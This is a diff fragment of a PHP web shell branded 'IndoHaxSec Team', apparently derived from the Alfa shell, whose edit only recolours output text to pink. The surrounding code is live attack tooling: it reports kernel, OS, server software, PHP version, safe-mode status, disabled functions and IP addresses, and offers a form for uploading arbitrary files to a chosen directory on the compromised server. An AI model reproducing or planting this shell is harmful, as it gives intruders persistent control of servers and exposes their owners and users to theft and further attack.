@@ -819,11 +819,11 @@ echo "<title>IndoHaxSec Team</title>";
 echo "<body bgcolor=#800080>";
 echo '<b><big><font color=#4B0082>Kernel : </font><font color="#4B0082">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
 $safe_mode = @ini_get('safe_mode');
-if($safe_mode){$r = "<b style='color: red'>On</b>";}else{$r = "<b style='color: green'>Off</b>";}
-echo "<br><b style='color: #4B0082'>OS: </font><font color=white>" . PHP_OS . "</font><br>";
-echo "<b style='color: #7CFC00'>Software: </font><font color=white>" . $_SERVER ['SERVER_SOFTWARE'] . "</font><br>";
-echo "PHP Version: <font color=white>" . PHP_VERSION .  "</font><br />";
-echo "PWD:<font color=#4B0082> " . str_replace("\\","/",@alfaGetCwd()) . "/<br />";
+if($safe_mode){$r = "<b style='color: red'>On</b>";}else{$r = "<b style='color: pink'>Off</b>";}
+echo "<br><b style='color: #4B0082'>OS: </font><font color=pink>" . PHP_OS . "</font><br>";
+echo "<b style='color: #7CFC00'>Software: </font><font color=pink>" . $_SERVER ['SERVER_SOFTWARE'] . "</font><br>";
+echo "PHP Version: <font color=pink>" . PHP_VERSION .  "</font><br />";
+echo "PWD:<font color=#FFC0CB> " . str_replace("\\","/",@alfaGetCwd()) . "/<br />";
 echo "<b style='color: #4B0082'>Safe Mode : $r<br>";
 echo"<font color=#7CFC00>Disable functions : </font>";
 $disfun = @ini_get('disable_functions');
@@ -831,8 +831,8 @@ if(empty($disfun)){$disfun = '<font color="green">NONE</font>';}
 echo"<font color=red>";
 echo "$disfun";
 echo"</font><br>";
-echo "<b style='color: #4B0082'>Your Ip Address is :  </font><font color=white>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
-echo "<b style='color: #4B0082'>Server Ip Address is :  </font><font color=white>".(function_exists('gethostbyname')?@gethostbyname($_SERVER["HTTP_HOST"]):'???')."</font><br><p>";
+echo "<b style='color: #4B0082'>Your Ip Address is :  </font><font color=pink>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
+echo "<b style='color: #4B0082'>Server Ip Address is :  </font><font color=pink>".(function_exists('gethostbyname')?@gethostbyname($_SERVER["HTTP_HOST"]):'???')."</font><br><p>";
 echo '<hr><center><form onSubmit="this.upload.disabled=true;this.cwd.value = btoa(unescape(encodeURIComponent(this.cwd.value)));" action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
 echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@alfaGetCwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
 if(isset($_FILES['file'])){
